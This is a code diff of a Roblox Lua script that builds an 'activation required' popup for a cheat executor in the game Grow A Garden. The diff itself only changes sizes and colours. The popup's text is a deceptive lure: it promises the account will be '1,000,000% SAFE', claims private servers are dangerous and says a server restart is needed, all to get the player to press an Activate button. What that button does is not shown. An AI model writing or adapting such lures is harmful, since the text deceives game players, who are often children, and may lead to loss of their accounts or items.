@@ -5,8 +5,8 @@ gui.ZIndexBehavior = Enum.ZIndexBehavior.Sibling
 
 local mainFrame = Instance.new("Frame")
 mainFrame.Name = "MainFrame"
-mainFrame.Size = UDim2.new(0, 500, 0, 500)
-mainFrame.Position = UDim2.new(0.5, -250, 0.5, -250)
+mainFrame.Size = UDim2.new(0, 320, 0, 240)
+mainFrame.Position = UDim2.new(0.5, -160, 0.5, -120)
 mainFrame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
 mainFrame.ClipsDescendants = true
 
@@ -15,7 +15,7 @@ mainCorner.CornerRadius = UDim.new(0, 8)
 mainCorner.Parent = mainFrame
 
 local mainBorder = Instance.new("UIStroke")
-mainBorder.Color = Color3.fromRGB(200, 60, 80)
+mainBorder.Color = Color3.fromRGB(100, 150, 255)
 mainBorder.Thickness = 2
 mainBorder.Parent = mainFrame
 
@@ -34,10 +34,10 @@ local title = Instance.new("TextLabel")
 title.Name = "Title"
 title.Text = "ACTIVATION REQUIRED"
 title.Font = Enum.Font.FredokaOne
-title.TextSize = 18
+title.TextSize = 16
 title.TextColor3 = Color3.fromRGB(255, 120, 120)
 title.BackgroundTransparency = 1
-title.Size = UDim2.new(0, 300, 1, 0)
+title.Size = UDim2.new(0, 200, 1, 0)
 title.Position = UDim2.new(0, 12, 0, 0)
 title.TextXAlignment = Enum.TextXAlignment.Left
 
@@ -59,29 +59,29 @@ closeCorner.Parent = closeButton
 local contentFrame = Instance.new("Frame")
 contentFrame.Name = "ContentFrame"
 contentFrame.BackgroundTransparency = 1
-contentFrame.Size = UDim2.new(1, -20, 1, -60)
-contentFrame.Position = UDim2.new(0, 10, 0, 40)
+contentFrame.Size = UDim2.new(1, -16, 1, -60)
+contentFrame.Position = UDim2.new(0, 8, 0, 40)
 
 local scrollFrame = Instance.new("ScrollingFrame")
 scrollFrame.Size = UDim2.new(1, 0, 1, 0)
 scrollFrame.BackgroundTransparency = 1
 scrollFrame.ScrollBarThickness = 6
 scrollFrame.ScrollBarImageColor3 = Color3.fromRGB(100, 150, 255)
-scrollFrame.CanvasSize = UDim2.new(0, 0, 3, 0)
+scrollFrame.CanvasSize = UDim2.new(0, 0, 2.5, 0)
 scrollFrame.ScrollingDirection = Enum.ScrollingDirection.Y
 
 local layout = Instance.new("UIListLayout")
-layout.Padding = UDim.new(0, 15)
+layout.Padding = UDim.new(0, 8)
 layout.Parent = scrollFrame
 
 local warningLabel = Instance.new("TextLabel")
 warningLabel.Name = "WarningLabel"
 warningLabel.Text = "Whoops! Stop Right There, We Need Your Executor To Be Activated First..."
 warningLabel.Font = Enum.Font.FredokaOne
-warningLabel.TextSize = 20
+warningLabel.TextSize = 16
 warningLabel.TextColor3 = Color3.fromRGB(255, 120, 120)
 warningLabel.BackgroundTransparency = 1
-warningLabel.Size = UDim2.new(1, 0, 0, 80)
+warningLabel.Size = UDim2.new(1, 0, 0, 60)
 warningLabel.TextWrapped = true
 warningLabel.TextXAlignment = Enum.TextXAlignment.Center
 
@@ -89,21 +89,21 @@ local messageLabel = Instance.new("TextLabel")
 messageLabel.Name = "MessageLabel"
 messageLabel.Text = "Before you can access the exploits/vulnerabilities your executor must be activated first. Why is that needed? It is to make sure your account will be 1,000,000% SAFE! Executors doesn't guarantees your safety especially towards Grow A Garden Soft Bans (ex. Trade Failed, Data Loss, etc.) because they have nothing to do with your account in the first place, now during this activation it will restart your server to the most optimal ones (if you think Private Server is safe then you are wrong, its easier to track you in the Private Server than the Public Server). After the Server Restart you are good to go sometimes it might bug your character and its fine, it is natural to bug and glitch sometimes since you are doing it with other people in the same server. To Continue, please press the Activate Button below this message. ~pocari ;)"
 messageLabel.Font = Enum.Font.GothamSemibold
-messageLabel.TextSize = 14
+messageLabel.TextSize = 12
 messageLabel.TextColor3 = Color3.fromRGB(220, 220, 255)
 messageLabel.BackgroundTransparency = 1
-messageLabel.Size = UDim2.new(1, 0, 0, 250)
+messageLabel.Size = UDim2.new(1, 0, 0, 200)
 messageLabel.TextWrapped = true
 
 local activateButton = Instance.new("TextButton")
 activateButton.Name = "ActivateButton"
 activateButton.Text = "ACTIVATE (7)"
 activateButton.Font = Enum.Font.FredokaOne
-activateButton.TextSize = 18
+activateButton.TextSize = 16
 activateButton.TextColor3 = Color3.fromRGB(255, 255, 255)
 activateButton.BackgroundColor3 = Color3.fromRGB(200, 60, 80)
-activateButton.Size = UDim2.new(0.6, 0, 0, 40)
-activateButton.Position = UDim2.new(0.2, 0, 0, 0)
+activateButton.Size = UDim2.new(0.8, 0, 0, 30)
+activateButton.Position = UDim2.new(0.1, 0, 0, 0)
 activateButton.BorderSizePixel = 0
 activateButton.AutoButtonColor = false
 activateButton.Active = false
@@ -216,8 +216,8 @@ mainFrame.Size = UDim2.new(0, 10, 0, 10)
 mainFrame.Position = UDim2.new(0.5, -5, 0.5, -5)
 
 local openTween = tweenService:Create(mainFrame, TweenInfo.new(0.5, Enum.EasingStyle.Back), {
-    Size = UDim2.new(0, 500, 0, 500),
-    Position = UDim2.new(0.5, -250, 0.5, -250),
+    Size = UDim2.new(0, 320, 0, 240),
+    Position = UDim2.new(0.5, -160, 0.5, -120),
     BackgroundTransparency = 0
 })
 openTween:Play()
